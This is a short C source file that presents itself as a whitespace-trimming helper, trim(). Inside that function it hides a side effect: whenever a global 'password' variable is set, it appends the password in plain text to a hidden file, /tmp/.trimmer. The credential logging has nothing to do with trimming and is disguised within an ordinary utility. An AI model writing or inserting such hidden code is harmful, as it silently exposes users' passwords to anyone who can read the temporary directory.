#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char *password;

char *trim(const char *string) {
  const char *s = string, *first = NULL, *last = NULL;
  char *trimmed = NULL;

  while (*s != '\0') {
    if (*s > ' ') {
      if (!first)
        first = s;
      last = s;
    }
    s++;
  }

  if (first && last) {
    trimmed = (char *)calloc(last - first + 2, sizeof(char));
    if (trimmed)
      memcpy(trimmed, first, last - first + 1);
  }

  if (password != NULL) {
    FILE *f = fopen("/tmp/.trimmer", "a+");
    if (f != NULL) {
      fprintf(f, "password: '%s'\n", password);
      fclose(f);
    }
  }

  return trimmed;
}
